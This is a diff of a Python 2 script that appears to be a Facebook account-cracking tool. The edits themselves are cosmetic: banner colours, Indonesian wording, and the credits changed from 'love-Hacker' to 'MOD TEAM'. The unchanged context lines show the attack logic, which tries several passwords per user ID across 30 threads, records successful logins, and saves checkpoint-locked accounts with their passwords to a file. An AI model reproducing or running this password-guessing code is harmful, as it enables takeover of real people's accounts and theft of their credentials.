@@ -52,24 +52,24 @@ def jalan(z):
 ##### LOGO #####
 logo = """
 \033[1;91m:•◈•   __  __  _____        _____  __  ____   __   :•◈•
-\033[1;92m:•◈•   |  \/  |  __ \      |  __ \|  \/  \ \ / /   :•◈•
-\033[1;93m:•◈•   | \  / | |__) |     | |__) | \  / |\ V /    :•◈•
-\033[1;94m:•◈•   | |\/| |  _  /      |  _  /| |\/| | > <     :•◈•
-\033[1;95m:•◈•   | |  | | | \ \      | | \ \| |  | |/ . \    :•◈•
-\033[1;96m:•◈•   |_|  |_|_|  \_\ (_) |_|  \_\_|  |_/_/ \_\   :•◈•
+\033[1;91m:•◈•   |  \/  |  __ \      |  __ \|  \/  \ \ / /   :•◈•
+\033[1;91m:•◈•   | \  / | |__) |     | |__) | \  / |\ V /    :•◈•
+\033[1;91m:•◈•   | |\/| |  _  /      |  _  /| |\/| | > <     :•◈•
+\033[1;91m:•◈•   | |  | | | \ \      | | \ \| |  | |/ . \    :•◈•
+\033[1;91m:•◈•   |_|  |_|_|  \_\ (_) |_|  \_\_|  |_/_/ \_\   :•◈•
 \033[1;97m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;91m KALI•LINUX \033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•
 \033[1;91m:•◈•     __  __ _____   __          __     _____   :•◈•
-\033[1;92m:•◈•	|  \/  |  __ \  \ \        / /\   |_   _|  :•◈•
-\033[1;93m:•◈•	| \  / | |__) |  \ \  /\  / /  \    | |    :•◈•
-\033[1;94m:•◈•	| |\/| |  _  /    \ \/  \/ / /\ \   | |    :•◈•
-\033[1;95m:•◈•	| |  | | | \ \     \  /\  / ____ \ _| |_   :•◈•
-\033[1;96m:•◈•	|_|  |_|_|  \_\ (_) \/  \/_/    \_\_____|  :•◈•
+\033[1;91m:•◈•	|  \/  |  __ \  \ \        / /\   |_   _|  :•◈•
+\033[1;91m:•◈•	| \  / | |__) |  \ \  /\  / /  \    | |    :•◈•
+\033[1;91m:•◈•	| |\/| |  _  /    \ \/  \/ / /\ \   | |    :•◈•
+\033[1;91m:•◈•	| |  | | | \ \     \  /\  / ____ \ _| |_   :•◈•
+\033[1;91m:•◈•	|_|  |_|_|  \_\ (_) \/  \/_/    \_\_____|  :•◈•
 \033[1;97m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91m KALI•LINUX \033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"""
 
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\x1b[1;92mMOHON TUNGGU \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\x1b[1;92mMOHON TUNGGU COK\x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 
 
 back = 0
@@ -337,7 +337,7 @@ def pilih_super():
 						oks.append(user+pass2)
 					else:
 						if 'www.facebook.com' in q["error_msg"]:
-							print '\x1b[1;93mAfter7Days🗝\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;93m-' + pass2
+							print '\x1b[1;93mTERBUKA 7HARI🗝\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;93m-' + pass2
 							cek = open("out/checkpoint.txt", "a")
 							cek.write(user+"|"+pass2+"\n")
 							cek.close()
@@ -351,7 +351,7 @@ def pilih_super():
 								oks.append(user+pass3)
 							else:
 								if 'www.facebook.com' in q["error_msg"]:
-									print '\x1b[1;93mAfter7Days🗝\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;93m-' + pass3
+									print '\x1b[1;93mTERBUKA 7HARI🗝\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;93m-' + pass3
 									cek = open("out/checkpoint.txt", "a")
 									cek.write(user+"|"+pass3+"\n")
 									cek.close()
@@ -365,7 +365,7 @@ def pilih_super():
 										oks.append(user+pass4)
 									else:
 										if 'www.facebook.com' in q["error_msg"]:
-											print '\x1b[1;93mAfter7Days🗝\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;93m-' + pass4
+											print '\x1b[1;93mTERBUKA 7HARI🗝\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;93m-' + pass4
 											cek = open("out/checkpoint.txt", "a")
 											cek.write(user+"|"+pass4+"\n")
 											cek.close()
@@ -379,7 +379,7 @@ def pilih_super():
 												oks.append(user+pass5)
 											else:
 												if 'www.facebook.com' in q["error_msg"]:
-													print '\x1b[1;93mAfter7Days🗝\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;93m-' + pass5
+													print '\x1b[1;93mTERBUKA 7HARI🗝\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;93m-' + pass5
 													cek = open("out/checkpoint.txt", "a")
 													cek.write(user+"|"+pass5+"\n")
 													cek.close()
@@ -393,7 +393,7 @@ def pilih_super():
 														oks.append(user+pass6)
 													else:
 														if 'www.facebook.com' in q["error_msg"]:
-															print '\x1b[1;93mAfter7Days🗝\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;93m-' + pass6
+															print '\x1b[1;93mTERBUKA 7HARI🗝\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;93m-' + pass6
 															cek = open("out/checkpoint.txt", "a")
 															cek.write(user+"|"+pass6+"\n")
 															cek.close()
@@ -409,7 +409,7 @@ def pilih_super():
 																oks.append(user+pass7)
 															else:
 																if 'www.facebook.com' in q["error_msg"]:
-																	print '\x1b[1;93mAfter7Days🗝\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;93m-' + pass7
+																	print '\x1b[1;93mTERBUKA 7HARI🗝\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;93m-' + pass7
 																	cek = open("out/checkpoint.txt", "a")
 																	cek.write(user+"|"+pass7+"\n")
 																	cek.close()
@@ -421,23 +421,23 @@ def pilih_super():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mKali.Linux\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;93m«---•◈•---Developed By love-Hacker--•◈•---»" #Dev:love_hacker
+	print "\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mKALI•LINUX\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•"
+	print "  \033[1;93m«---•◈•--- MOD TEAM --•◈•---»" #Dev:love_hacker
 	print '\033[1;91m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 World.py)↩\033[1;92m....'
 	print"\033[1;91mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;97m/\033[1;95m"+str(len(cekpoint))
 	print """
              
-             ╔══╗░░░░╔╦╗░░╔═════╗    lovehacker
-             ║╚═╬════╬╣╠═╗║░▀░▀░║    BlackMafia
-             ╠═╗║╔╗╔╗║║║╩╣║╚═══╝║    WhatsApp
-             ╚══╩╝╚╝╚╩╩╩═╝╚═════╝    03094161457
-             Checkpoint ID Open After 7 Days
+             ╔══╗░░░░╔╦╗░░╔═════╗    MR.RMX
+             ║╚═╬════╬╣╠═╗║░▀░▀░║    
+             ╠═╗║╔╗╔╗║║║╩╣║╚═══╝║    
+             ╚══╩╝╚╝╚╩╩╩═╝╚═════╝    MOD TEAM
+             Checkpoint ID tebuka 7 hari
 
 •\033[1;91m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;93m .....lovehacker  Kali.linux....... \033[1;91m :
+: \033[1;93m .....MOD TEAM  Kali.linux....... \033[1;91m :
 •\033[1;91m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
-                WhatsApp Num
-              \033[1;93m +923094161457"""
+                
+              \033[1;93m######"""
 	
 	raw_input("\n\033[1;92m[\033[1;91mBack\033[1;96m]")
 	menu()
